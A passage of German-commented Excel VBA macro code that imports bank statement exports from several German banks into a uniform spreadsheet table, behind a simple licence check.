                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 22) = vwz8
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 23) = vwz9
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 24) = vwz10
                                                                
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 17) = "EUR"
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 18) = transaktionstyp
         
            outputzeile = outputzeile + 1
       End If
       End If

nachsteZeileR:
      Next zeile1
endeR:
Application.DisplayAlerts = False
Workbooks(mandantendatei).Close
Application.DisplayAlerts = True
Workbooks(macrodatei).Activate
Sheets("Tabelle").Select
Application.ScreenUpdating = True
End If    'ende rakuten  ######################################################################################################


'Kontist
If bank = "Kontist" Then
If Left(Version, 4) <> "Bank" Then MsgBox ("Du hast keine Bank-Lizenz. Bitte kontaktiere www.sbco.cloud um eine Lizenz zu erwerben!"): GoTo endeL
     Application.Workbooks.OpenText Filename:=fremdprogramm, DataType:=xlDelimited, Semicolon:=True, Local:=True
     Workbooks.OpenText Filename:= _
    fremdprogramm, Origin:=xlMSDOS, Local:=True, StartRow:=1, DataType:=xlDelimited, TextQualifier:= _
        xlDoubleQuote, ConsecutiveDelimiter:=False, Tab:=True, Semicolon:=True _
        , Comma:=True, Space:=False, Other:=False, FieldInfo:=Array(Array(1, 1), _
        Array(2, 1), Array(3, 1), Array(4, 1), Array(5, 1), Array(6, 1), Array(7, 1)), _
        TrailingMinusNumbers:=True
   Workbooks.OpenText Filename:= _
        fremdprogramm, Origin:= _
        65001, StartRow:=1, Local:=True
     
    fidorsheet = ActiveSheet.Name
    fremdprogrammDatei = ActiveWorkbook.Name
    Workbooks(fremdprogrammDatei).Activate
    x = Application.WorksheetFunction.Min(ActiveSheet.UsedRange.SpecialCells(xlCellTypeLastCell).Row, max)
       For zeile1 = 6 To x
                If Cells(zeile1, 1) = "Kontostand" Then Exit For
                datum = Cells(zeile1, 2)
                empfaenger1 = Left(Cells(zeile1, 4), 27)
                empfaenger2 = Mid(Cells(zeile1, 4), 28, 27)
                IbanAuftraggeber = Cells(zeile1, 6)
                transaktionstyp = Cells(zeile1, 3)
                vwz1 = Left(Cells(zeile1, 7), 27)
                vwz2 = Mid(Cells(zeile1, 7), 28, 27)
                vwz3 = Mid(Cells(zeile1, 7), 54, 27)
                vwz4 = Mid(Cells(zeile1, 7), 81, 27)
                             
                vwz5 = Cells(zeile1, 8)
                
                
                betrag = Cells(zeile1, 5)
                '# Schreiben
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 1) = bankleitzahl
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 2) = Kontonummer
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 5) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 6) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 7) = betrag
                 If Left(empfaenger1, 1) = "-" Or Left(empfaenger1, 1) = "+" Then empfaenger1 = " " & empfaenger1
                 Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 8) = empfaenger1
                 Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 9) = empfaenger2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 11) = IbanAuftraggeber
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 12) = vwz1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 13) = vwz2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 14) = vwz3
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 15) = vwz4
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 19) = vwz5
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 17) = "EUR"
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 18) = transaktionstyp
                        
                        
                transaktionstyp = ""
              Next zeile1
Application.DisplayAlerts = False
   
   
   ActiveWorkbook.Close
Application.DisplayAlerts = True
              
 Workbooks(macrodatei).Activate
    End If    'Kontist

'Deutsche Bank
If bank = "Deutsche Bank" Then
If Left(Version, 4) <> "Bank" Then MsgBox ("Du hast keine Bank-Lizenz. Bitte kontaktiere www.sbco.cloud um eine Lizenz zu erwerben!"): GoTo endeL
   Workbooks.OpenText Filename:= _
        fremdprogramm, Origin:= _
        65001, StartRow:=1, Local:=True
     
    Columns("D:J").Select
    Selection.Replace What:="=", Replacement:="", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="-", Replacement:="", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    
    fidorsheet = ActiveSheet.Name
    fremdprogrammDatei = ActiveWorkbook.Name
    Workbooks(fremdprogrammDatei).Activate
    x = Application.WorksheetFunction.Min(ActiveSheet.UsedRange.SpecialCells(xlCellTypeLastCell).Row, max)
       For zeile1 = 6 To x
                If Cells(zeile1, 1) = "Kontostand" Then Exit For
                datum = Cells(zeile1, 2)
                empfaenger = Cells(zeile1, 4)
                IbanAuftraggeber = Cells(zeile1, 6)
                transaktionstyp = Cells(zeile1, 3)
                vwz1 = Left(Cells(zeile1, 5), 27)
                vwz2 = Mid(Cells(zeile1, 5), 28, 27)
                vwz3 = Mid(Cells(zeile1, 5), 54, 27)
                vwz4 = Mid(Cells(zeile1, 5), 81, 27)
                             
                vwz5 = Cells(zeile1, 8)
                
                
                betrag = Cells(zeile1, 16) + Cells(zeile1, 17)
                '# Schreiben
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 1) = bankleitzahl
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 2) = Kontonummer
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 5) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 6) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 7) = betrag
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 8) = empfaenger
                If Left(empfaenger, 1) = "-" Or Left(empfaenger, 1) = "+" Then empfaenger = " " & empfaenger
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 11) = IbanAuftraggeber
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 12) = vwz1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 13) = vwz2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 14) = vwz3
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 15) = vwz4
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 16) = vwz5
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 17) = "EUR"
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 18) = transaktionstyp
                        
                        
                transaktionstyp = ""
              Next zeile1
 Workbooks(macrodatei).Activate
    End If    'Deutsche Bank

'netBank
If bank = "netbank" Then
If Left(Version, 4) <> "Bank" Then MsgBox ("Du hast keine Bank-Lizenz. Bitte kontaktiere www.sbco.cloud um eine Lizenz zu erwerben!"): GoTo endeL
   Workbooks.OpenText Filename:= _
       fremdprogramm, Origin:= _
       65001, StartRow:=1, Local:=True
        
    Columns("A:A").Select
    Selection.TextToColumns Destination:=Range("A1"), DataType:=xlDelimited, _
        TextQualifier:=xlDoubleQuote, ConsecutiveDelimiter:=False, Tab:=True, _
        Semicolon:=True, Comma:=False, Space:=False, Other:=False, FieldInfo _
        :=Array(Array(1, 1), Array(2, 1), Array(3, 1), Array(4, 1), Array(5, 1)), _
        TrailingMinusNumbers:=True
    Columns("A:F").Select
    Columns("A:F").EntireColumn.AutoFit
    Range("A13").Select
     
     
    fidorsheet = ActiveSheet.Name
    fremdprogrammDatei = ActiveWorkbook.Name
    Workbooks(fremdprogrammDatei).Activate
    x = Application.WorksheetFunction.Min(ActiveSheet.UsedRange.SpecialCells(xlCellTypeLastCell).Row, max)
       For zeile1 = 11 To x
            'Zeile1 = 21
                empfaenger = ""
                IbanAuftraggeber = ""
                datum = Cells(zeile1, 1)
                '
                'IbanAuftraggeber = Cells(zeile1, 6)
                transaktionstyp = Cells(zeile1, 3)
                Text = Cells(zeile1, 4)
                If Left(Text, 12) = "|fffd|berweisung " Then Text = Right(Text, Len(Text) - 12)
                If Left(Text, 12) = "Lastschrift " Then Text = Right(Text, Len(Text) - 12)
                If Left(Text, 11) = "Gutschrift " Then Text = Right(Text, Len(Text) - 11)
                If Left(Text, 13) = "Dauerauftrag " Then Text = Right(Text, Len(Text) - 13)
                ibanstelle = InStr(Text, "IBAN")
                If ibanstelle > 0 Then
                    empfaenger = Left(Text, ibanstelle - 1)
                    IbanAuftraggeber = Mid(Text, ibanstelle + 5, 22)
                    Text = Right(Text, Len(Text) - 27 - ibanstelle)
                 End If
                vwz1 = Left(Text, 27)
                vwz2 = Mid(Text, 28, 27)
                vwz3 = Mid(Text, 54, 27)
                vwz4 = Mid(Text, 81, 27)
                vwz5 = Mid(Text, 108, 27)
                vwz6 = Mid(Text, 135, 27)
                vwz7 = Mid(Text, 162, 27)
                vwz9 = Mid(Text, 189, 27)
                vwz10 = Mid(Text, 216, 27)
                      
                
                
                betrag = Cells(zeile1, 16) + Cells(zeile1, 5)
                '# Schreiben
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 1) = bankleitzahl
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 2) = Kontonummer
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 5) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 6) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 7) = betrag
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 8) = empfaenger
                If Left(empfaenger, 1) = "-" Or Left(empfaenger, 1) = "+" Then empfaenger = " " & empfaenger
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 11) = IbanAuftraggeber
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 12) = vwz1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 13) = vwz2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 14) = vwz3
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 15) = vwz4

                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 17) = "EUR"
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 18) = transaktionstyp
                        
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 19) = vwz5
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 20) = vwz6
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 21) = vwz7
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 22) = vwz8
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 23) = vwz9
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 24) = vwz10
                transaktionstyp = ""
              Next zeile1
  
  Application.DisplayAlerts = False
   ActiveWorkbook.Close
   'Name fremdprogramm As fremdprogramm & Left(fremdprogramm, Len(fremdprogramm - 4))
  Application.DisplayAlerts = True
 
 
 
 Workbooks(macrodatei).Activate
 
 
 
    End If    'netbank

'PENTA ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
If bank = "Penta" Then
If Left(Version, 4) <> "Bank" Then MsgBox ("Du hast keine Bank-Lizenz. Bitte kontaktiere www.sbco.cloud um eine Lizenz zu erwerben!"): GoTo endeL
'Name fremdprogramm As fremdprogramm & ".txt"
'fremdprogramm = fremdprogramm & ".txt"

 '       Workbooks.OpenText Filename:= _
  '      fremdprogramm _
   '     , Origin:=65001, StartRow:=1, DataType:=xlDelimited, TextQualifier:= _
    '    xlDoubleQuote, ConsecutiveDelimiter:=False, Tab:=True, Semicolon:=False, _
     '   Comma:=True, Space:=False, Other:=False, FieldInfo:=Array(Array(1, 1), _
      '  Array(2, 1), Array(3, 1), Array(4, 1), Array(5, 1), Array(6, 1), Array(7, 1), Array(8, 1)), _
       ' TrailingMinusNumbers:=True
      
      
       Application.Workbooks.OpenText Filename:=fremdprogramm, DataType:=xlDelimited, Comma:=True, FieldInfo:=Array(Array(1, 4), Array(2, 4), Array(3, 1), Array(4, 1), Array(5, 1), Array(6, 1), Array(7, 1))
    letzteZeile = Sheets(1).UsedRange.SpecialCells(xlCellTypeLastCell).Row
   datendatei = ActiveWorkbook.Name
   
 Application.Workbooks(datendatei).Sheets(1).Activate

    AssDateLastRow = ActiveSheet.Range("A" & Rows.Count & ":B" & Rows.Count).End(xlUp).Row
    ActiveSheet.Range("E4:E" & AssDateLastRow).NumberFormat = "dd.mm.yyyy;@"
    'Set the format

        Range("A2:A" & AssDateLastRow).Select
        Selection.TextToColumns DataType:=xlDelimited, ConsecutiveDelimiter:=True, _
         Space:=True, FieldInfo:=Array(1, 4)
 Range("B2:B" & AssDateLastRow).Select
        Selection.TextToColumns DataType:=xlDelimited, ConsecutiveDelimiter:=True, _
         Space:=True, FieldInfo:=Array(1, 4)
    
    'Use text to columns to force a format update
     
     
     
     fidorsheet = ActiveSheet.Name
    fremdprogrammDatei = ActiveWorkbook.Name
    Workbooks(fremdprogrammDatei).Activate
        'schleife Daten lesen
     
            x = Application.WorksheetFunction.Min(ActiveSheet.UsedRange.SpecialCells(xlCellTypeLastCell).Row, max)
            
            For zeile1 = 2 To x
                datum = Cells(zeile1, 2)
                empfaenger = Cells(zeile1, 3)
                IbanAuftraggeber = Cells(zeile1, 4)
                transaktionstyp = Cells(zeile1, 5)
                vwz1 = Left(Cells(zeile1, 6), 27)
                vwz2 = Mid(Cells(zeile1, 6), 28, 27)
                vwz3 = Mid(Cells(zeile1, 6), 54, 27)
                vwz4 = Mid(Cells(zeile1, 6), 81, 27)
                'vwz5 = Cells(zeile1, 8)
                
                betrag = Cells(zeile1, 7)
                '# Schreiben
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 1) = bankleitzahl
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 2) = Kontonummer
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 5) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 6) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 7) = betrag
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 8) = empfaenger
                If Left(empfaenger, 1) = "-" Or Left(empfaenger, 1) = "+" Then empfaenger = " " & empfaenger
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 11) = IbanAuftraggeber
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 12) = vwz1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 13) = vwz2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 14) = vwz3
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 15) = vwz4
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 16) = vwz5
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 17) = "EUR"
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 18) = transaktionstyp
                        
                        
                transaktionstyp = ""
              Next zeile1
  
  
  Application.DisplayAlerts = False
   ActiveWorkbook.Close
   'Name fremdprogramm As fremdprogramm & Left(fremdprogramm, Len(fremdprogramm - 4))
  Application.DisplayAlerts = True
  
  
Workbooks(macrodatei).Activate
'Sheets("1").Select
  
  End If    'Penta



'Sparkasse Kreditkarte #########################################################################################################################
If bank = "Kreditkarte Sparkasse" Then
If Left(Version, 4) <> "Bank" Then MsgBox ("Du hast keine Bank-Lizenz. Bitte kontaktiere www.sbco.cloud um eine Lizenz zu erwerben!"): GoTo endeL
Name fremdprogramm As fremdprogramm & ".txt"
fremdprogramm = fremdprogramm & ".txt"

      Workbooks.OpenText Filename:= _
        fremdprogramm, Origin:= _
        -535, StartRow:=1, DataType:=xlDelimited, TextQualifier:=xlDoubleQuote, _
        ConsecutiveDelimiter:=False, Tab:=False, Semicolon:=True, Comma:=True, _
        Space:=False, Other:=False, FieldInfo:=Array(Array(1, 1), Array(2, 2), Array( _
        3, 2), Array(4, 2), Array(5, 2), Array(6, 2), Array(7, 1), Array(8, 1), Array(9, 1), Array(10 _
        , 1)), DecimalSeparator:=",", ThousandsSeparator:=".", TrailingMinusNumbers _
        :=True
    
   ' Workbooks.Open Filename:=fremdprogramm
    fidorsheet = ActiveSheet.Name
    fremdprogrammDatei = ActiveWorkbook.Name
    Workbooks(fremdprogrammDatei).Activate
        'schleife Daten lesen
        
   '        Columns("C:C").Select
        
         x = Application.WorksheetFunction.Min(ActiveSheet.UsedRange.SpecialCells(xlCellTypeLastCell).Row, max)
            
            For zeile1 = 2 To x
                datum = Cells(zeile1, 3)
                empfaenger = Cells(zeile1, 9)
                'kontoEmpf = Cells(zeile1, 3)
                'transaktionstyp = Cells(zeile1, 4)
                 
                vwz = Cells(zeile1, 10)
                betrag = Cells(zeile1, 4)
                '# Schreiben
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 1) = bankleitzahl
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 2) = Kontonummer
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 5) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 6) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 7) = betrag
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 8) = empfaenger
                If Left(empfaenger, 1) = "-" Or Left(empfaenger, 1) = "+" Then empfaenger = " " & empfaenger
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 12) = vwz
                If Left(vwz, 1) = "-" Or Left(vwz, 1) = "+" Then vwz = " " & vwz
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 17) = "EUR"
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 18) = transaktionstyp
                transaktionstyp = ""
              Next zeile1
Workbooks(macrodatei).Activate
 Application.DisplayAlerts = False
   'Cells(1, 1) = fremdprogramm
  ' Workbooks(fremdprogramm).Close SaveChanges:=False
'   Name fremdprogramm As Left(fremdprogramm, Len(fremdprogramm) - 4)
  Application.DisplayAlerts = True
  
  End If    ' kreditkarte Sparkasse



If bank = "Commerzbank" Then
If Left(Version, 4) <> "Bank" Then MsgBox ("Du hast keine Bank-Lizenz. Bitte kontaktiere www.sbco.cloud um eine Lizenz zu erwerben!"): GoTo endeL
        Workbooks.OpenText Filename:= _
        fremdprogramm, _
        Origin:=65001, StartRow:=1, DataType:=xlDelimited, TextQualifier:= _
        xlDoubleQuote, ConsecutiveDelimiter:=False, Tab:=False, Semicolon:=True, _
        Comma:=False, Space:=False, Other:=False, FieldInfo:=Array(Array(1, 1), _
        Array(2, 1), Array(3, 1), Array(4, 1), Array(5, 1), Array(6, 1), Array(7, 1), Array(8, 1), _
        Array(9, 1), Array(10, 1)), TrailingMinusNumbers:=True
       
       fidorsheet = ActiveSheet.Name
       
       fremdprogrammDatei = ActiveWorkbook.Name
             
       
       Workbooks(fremdprogrammDatei).Activate
        'schleife Daten lesen
        
      x = Application.WorksheetFunction.Min(ActiveSheet.UsedRange.SpecialCells(xlCellTypeLastCell).Row, max)
            
            For zeile1 = 2 To x
                datum = Cells(zeile1, 1)
                empfaenger = ""
                'kontoEmpf = Cells(zeile1, 3)
                transaktionstyp = Cells(zeile1, 3)
                'vwz = Cells(zeile1, 4)
                vwz1 = Left(Cells(zeile1, 4), 27)
                vwz2 = Mid(Cells(zeile1, 4), 28, 27)
                vwz3 = Mid(Cells(zeile1, 4), 54, 27)
                vwz4 = Mid(Cells(zeile1, 4), 81, 27)
                vwz5 = Mid(Cells(zeile1, 4), 108, 27)
                vwz6 = Mid(Cells(zeile1, 4), 135, 27)
                vwz7 = Mid(Cells(zeile1, 4), 162, 27)
                vwz8 = Mid(Cells(zeile1, 4), 189, 27)
                vwz9 = Mid(Cells(zeile1, 4), 216, 27)
                vwz10 = Mid(Cells(zeile1, 4), 243, 27)
                betrag = Cells(zeile1, 5)
                '# Schreiben
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 1) = bankleitzahl
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 2) = Kontonummer
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 5) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 6) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 7) = betrag
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 8) = empfaenger
                If Left(empfaenger, 1) = "-" Or Left(empfaenger, 1) = "+" Then empfaenger = " " & empfaenger
                If Left(vwz1, 1) = "-" Or Left(vwz1, 1) = "+" Then vwz1 = " " & vwz1
                If Left(vwz2, 1) = "-" Or Left(vwz2, 1) = "+" Then vwz2 = " " & vwz2
                If Left(vwz3, 1) = "-" Or Left(vwz3, 1) = "+" Then vwz3 = " " & vwz3
                If Left(vwz4, 1) = "-" Or Left(vwz4, 1) = "+" Then vwz4 = " " & vwz4
                If Left(vwz5, 1) = "-" Or Left(vwz5, 1) = "+" Then vwz5 = " " & vwz5
                If Left(vwz6, 1) = "-" Or Left(vwz6, 1) = "+" Then vwz6 = " " & vwz6
                If Left(vwz7, 1) = "-" Or Left(vwz7, 1) = "+" Then vwz7 = " " & vwz7
                If Left(vwz8, 1) = "-" Or Left(vwz8, 1) = "+" Then vwz8 = " " & vwz8
                If Left(vwz9, 1) = "-" Or Left(vwz9, 1) = "+" Then vwz9 = " " & vwz9
               If Left(vwz10, 1) = "-" Or Left(vwz10, 1) = "+" Then vwz10 = " " & vwz10
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 12) = vwz1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 13) = vwz2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 14) = vwz3
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 15) = vwz4
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 19) = vwz5
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 20) = vwz6
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 21) = vwz7
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 22) = vwz8
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 23) = vwz9
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 24) = vwz10
                                                                        
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 17) = "EUR"
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 18) = transaktionstyp
                        
                        
                transaktionstyp = ""
              Next zeile1
Application.DisplayAlerts = False
ActiveWorkbook.Close
Application.DisplayAlerts = True
End If    ' commerzbank  Behandlung zu Ende

'  N26 ########################################################################################################

If bank = "N26" Then
If Left(Version, 4) <> "Bank" Then MsgBox ("Du hast keine Bank-Lizenz. Bitte kontaktiere www.sbco.cloud um eine Lizenz zu erwerben!"): GoTo endeL
    Workbooks.OpenText Filename:= _
        fremdprogramm, Origin:= _
        65001, StartRow:=1, DataType:=xlDelimited, TextQualifier:=xlDoubleQuote, _
        ConsecutiveDelimiter:=False, Tab:=False, Semicolon:=True, Comma:=True, _
        Space:=False, Other:=False, FieldInfo:=Array(Array(1, 1), Array(2, 2), Array( _
        3, 2), Array(4, 2), Array(5, 2), Array(6, 2), Array(7, 1), Array(8, 1), Array(9, 1), Array(10 _
        , 1)), DecimalSeparator:=".", ThousandsSeparator:=",", TrailingMinusNumbers _
        :=True
       fremdprogrammDatei = ActiveWorkbook.Name
       Workbooks(fremdprogrammDatei).Activate
        'schleife Daten lesen
          x = Application.WorksheetFunction.Min(ActiveSheet.UsedRange.SpecialCells(xlCellTypeLastCell).Row, max)
            
            For zeile1 = 2 To x
                datum = Cells(zeile1, 1)
                empfaenger1 = Left(Cells(zeile1, 2), 27)
                empfaenger2 = Mid(Cells(zeile1, 2), 28, 27)
                IbanEmpf = Cells(zeile1, 3)
                transaktionstyp = Cells(zeile1, 4)
                vwz1 = Left(Cells(zeile1, 5), 27)
                vwz2 = Mid(Cells(zeile1, 5), 28, 27)
                vwz3 = Mid(Cells(zeile1, 5), 54, 27)
                vwz4 = Mid(Cells(zeile1, 5), 81, 27)
                vwz5 = Mid(Cells(zeile1, 5), 108, 27)
                vwz6 = Mid(Cells(zeile1, 5), 135, 27)
                vwz7 = Mid(Cells(zeile1, 5), 162, 27)
                vwz8 = Mid(Cells(zeile1, 5), 189, 27)
                vwz9 = Mid(Cells(zeile1, 5), 216, 27)
                vwz10 = Mid(Cells(zeile1, 5), 243, 27)
                
                betrag = Cells(zeile1, 7)
                '# Schreiben
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 1) = bankleitzahl
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 2) = Kontonummer
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 5) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 6) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 7) = betrag
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 8) = empfaenger1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 9) = empfaenger2
                
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 11) = IbanEmpf
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 12) = vwz1
                If Left(vwz1, 1) = "-" Or Left(vwz1, 1) = "+" Then vwz1 = " " & vwz1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 13) = vwz2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 14) = vwz3
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 15) = vwz4
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 19) = vwz5
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 20) = vwz6
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 21) = vwz7
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 22) = vwz8
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 23) = vwz9
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 24) = vwz10
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 17) = "EUR"
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 18) = transaktionstyp
              Next zeile1
  End If    ' N26 Behandlung zu Ende
  

If bank = "DKB" Then
If Left(Version, 4) <> "Bank" Then MsgBox ("Du hast keine Bank-Lizenz. Bitte kontaktiere www.sbco.cloud um eine Lizenz zu erwerben!"): GoTo endeL
     
  ActiveWorkbook.Worksheets.Add
    With ActiveSheet.QueryTables.Add(Connection:= _
        "TEXT;" & fremdprogramm, Destination _
        :=Range("$A$1"))
        '.CommandType = 0
        .Name = "MdBlatt"
        .FieldNames = True
        .RowNumbers = False
        .FillAdjacentFormulas = False
        .PreserveFormatting = True
        .RefreshOnFileOpen = False
        .RefreshStyle = xlInsertDeleteCells
        .SavePassword = False
        .SaveData = True
        .AdjustColumnWidth = True
        .RefreshPeriod = 0
        .TextFilePromptOnRefresh = False
        .TextFilePlatform = 65001
        .TextFileStartRow = 1
        .TextFileParseType = xlDelimited
        .TextFileTextQualifier = xlTextQualifierDoubleQuote
        .TextFileConsecutiveDelimiter = False
        .TextFileTabDelimiter = False
        .TextFileSemicolonDelimiter = True
        .TextFileCommaDelimiter = False
        .TextFileSpaceDelimiter = False
        .TextFileColumnDataTypes = Array(1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1)
        .TextFileTrailingMinusNumbers = True
        .Refresh BackgroundQuery:=False
    End With
        DKBsheet = ActiveSheet.Name
        'schleife Daten lesen
      x = Application.WorksheetFunction.Min(ActiveSheet.UsedRange.SpecialCells(xlCellTypeLastCell).Row, max)
            
            For zeile1 = 8 To x
                datum = Cells(zeile1, 1)
                empfaenger = Cells(zeile1, 4)
                kontoEmpf = Cells(zeile1, 6)
                transaktionstyp = Cells(zeile1, 3)
                vwz = Cells(zeile1, 5)
                betrag = Cells(zeile1, 8)
                '# Schreiben
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 7, 1) = bankleitzahl
